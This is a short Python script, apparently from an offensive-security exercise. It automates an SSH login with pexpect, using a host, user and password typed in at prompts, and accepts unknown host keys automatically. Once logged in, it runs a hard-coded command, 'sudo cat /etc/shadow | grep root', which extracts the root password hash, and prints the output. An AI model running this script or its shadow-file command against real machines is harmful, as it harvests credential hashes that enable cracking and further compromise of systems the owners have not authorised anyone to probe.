#!/usr/bin/python3

import pexpect
from termcolor import colored

PROMPT = ['# ', '>>> ', '> ', '\$ ']

def connect(host, user, passwd):
   ssh_newkey = 'Are you sure you want to continue connecting'
   connStr = 'ssh ' + user + '@' + host
   child = pexpect.spawn(connStr)
   ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
   if ret == 0:
      print(colored('[-] Error Connecting', 'red'))
      return
   if ret == 1:
      child.sendline('yes')
      ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
      if ret == 0:
         print(colored('[-] Error Connecting', 'red'))
         return
   child.sendline(passwd)
   child.expect(PROMPT, timeout=0.5)
   return child

def send_command(child, command):
   child.sendline(command)
   child.expect(PROMPT)
   print(colored(child.before.decode("utf-8"), 'green'))

def main():
   host = input(colored('[+] Enter the ip address you want to connect to : ', 'green'))
   user = input(colored('[+] Enter the user you want to connect to : ', 'green'))
   passwd = input(colored('[+] Enter the password of the connected user : ', 'green'))
   child = connect(host, user, passwd)
   send_command(child, 'sudo cat /etc/shadow | grep root;ps')

if __name__ == "__main__":
   main()